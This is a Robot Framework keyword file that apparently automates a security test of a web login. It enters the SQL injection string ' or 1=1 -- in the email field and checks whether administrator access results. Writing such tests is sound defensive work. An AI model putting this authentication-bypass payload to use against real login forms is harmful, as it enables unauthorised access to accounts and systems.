*** Settings ***
Resource    ../resource/settings.robot
*** Keywords ***
I click on account
    Wait Until Element Is Visible    ${home.button_account}
    Click Element        ${home.button_account}
I click on Login
    Wait Until Element Is Visible    ${home.button_login}
    Click Element        ${home.button_login}
I fill the email field with malicious SQLi
    Wait Until Element Is Visible    ${login.field_email} 
    Input Text       ${login.field_email}    ' or 1=1 --
I fill in the password field with any value
    Wait Until Element Is Visible    ${login.field_password}
    Input Text       ${login.field_password}    123
I press the login button
    Wait Until Element Is Visible    ${login.button_login}
    Click Element        ${login.button_login}
I check if I have received administrator access
    Wait Until Page Contains    ${home.profile_admin}    30